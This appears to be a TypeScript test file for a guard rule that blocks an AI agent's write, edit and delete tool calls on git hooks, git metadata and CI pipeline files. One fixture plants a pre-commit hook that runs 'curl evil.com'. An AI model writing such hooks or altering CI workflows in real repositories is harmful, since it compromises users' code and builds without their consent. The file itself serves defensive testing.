import { describe, it, expect } from 'vitest';
import {
  isProtectedGitOrCIPath,
  inspectGitCIPath,
  createGitCIProtectionRule,
  gitCIProtectionRule,
} from '../src/fs/git_ci_protection.js';
import { ToolCallContext, Verdict } from '../src/types.js';

describe('Git Internals and CI/CD Tamper Protection Guard (Issue #74)', () => {
  describe('isProtectedGitOrCIPath detection', () => {
    it('detects .git hooks and executables', () => {
      expect(isProtectedGitOrCIPath('.git/hooks/pre-commit')).toBe(true);
      expect(isProtectedGitOrCIPath('.git/hooks/post-checkout')).toBe(true);
      expect(isProtectedGitOrCIPath('.git/hooks/pre-push')).toBe(true);
    });

    it('detects .git internal metadata and config', () => {
      expect(isProtectedGitOrCIPath('.git/config')).toBe(true);
      expect(isProtectedGitOrCIPath('.git/HEAD')).toBe(true);
      expect(isProtectedGitOrCIPath('.git/index')).toBe(true);
    });

    it('detects GitHub Actions workflow configurations', () => {
      expect(isProtectedGitOrCIPath('.github/workflows/ci.yml')).toBe(true);
      expect(isProtectedGitOrCIPath('.github/workflows/deploy.yaml')).toBe(true);
      expect(isProtectedGitOrCIPath('.github/workflows/test-suite.yml')).toBe(true);
    });

    it('detects other CI runner files (GitLab, Jenkins, CircleCI)', () => {
      expect(isProtectedGitOrCIPath('.gitlab-ci.yml')).toBe(true);
      expect(isProtectedGitOrCIPath('Jenkinsfile')).toBe(true);
      expect(isProtectedGitOrCIPath('.circleci/config.yml')).toBe(true);
      expect(isProtectedGitOrCIPath('azure-pipelines.yml')).toBe(true);
    });

    it('allows benign repository files', () => {
      expect(isProtectedGitOrCIPath('src/utils/git_helper.ts')).toBe(false);
      expect(isProtectedGitOrCIPath('docs/ci_cd_architecture.md')).toBe(false);
      expect(isProtectedGitOrCIPath('.gitignore')).toBe(false);
      expect(isProtectedGitOrCIPath('package.json')).toBe(false);
    });
  });

  describe('gitCIProtectionRule enforcement', () => {
    it('blocks write_file targeting .git/hooks/pre-commit with critical severity', () => {
      const ctx: ToolCallContext = {
        toolName: 'write_file',
        params: { path: '.git/hooks/pre-commit', content: '#!/bin/sh\ncurl evil.com' },
      };
      const violation = gitCIProtectionRule.evaluate(ctx);
      expect(violation).not.toBeNull();
      expect(violation?.verdict).toBe(Verdict.BLOCK);
      expect(violation?.severity).toBe('critical');
      expect(violation?.ruleId).toBe('fs-protect-git-and-ci-configs');
      expect(violation?.reason).toContain('Git Hook Executable (.git/hooks)');
    });

    it('blocks edit_file tampering with .github/workflows/ci.yml', () => {
      const ctx: ToolCallContext = {
        toolName: 'edit_file',
        params: { filePath: '.github/workflows/ci.yml' },
      };
      const violation = gitCIProtectionRule.evaluate(ctx);
      expect(violation).not.toBeNull();
      expect(violation?.verdict).toBe(Verdict.BLOCK);
      expect(violation?.reason).toContain('GitHub Actions Workflow (.github/workflows)');
    });

    it('blocks delete_file targeting Jenkinsfile', () => {
      const ctx: ToolCallContext = {
        toolName: 'delete_file',
        params: { path: 'Jenkinsfile' },
      };
      const violation = gitCIProtectionRule.evaluate(ctx);
      expect(violation).not.toBeNull();
      expect(violation?.verdict).toBe(Verdict.BLOCK);
    });

    it('allows read_file on .github/workflows without blocking', () => {
      const ctx: ToolCallContext = {
        toolName: 'read_file',
        params: { path: '.github/workflows/ci.yml' },
      };
      // Reading workflow files to inspect CI setup is safe by default
      expect(gitCIProtectionRule.evaluate(ctx)).toBeNull();
    });

    it('blocks reads as well when blockAllOperations is strictly configured', () => {
      const strictRule = createGitCIProtectionRule({ blockAllOperations: true });
      const ctx: ToolCallContext = {
        toolName: 'read_file',
        params: { path: '.github/workflows/ci.yml' },
      };
      expect(strictRule.evaluate(ctx)?.verdict).toBe(Verdict.BLOCK);
    });

    it('allows normal file writes in project directories', () => {
      const ctx: ToolCallContext = {
        toolName: 'write_file',
        params: { path: 'src/main.ts', content: 'console.log("hello");' },
      };
      expect(gitCIProtectionRule.evaluate(ctx)).toBeNull();
    });
  });
});
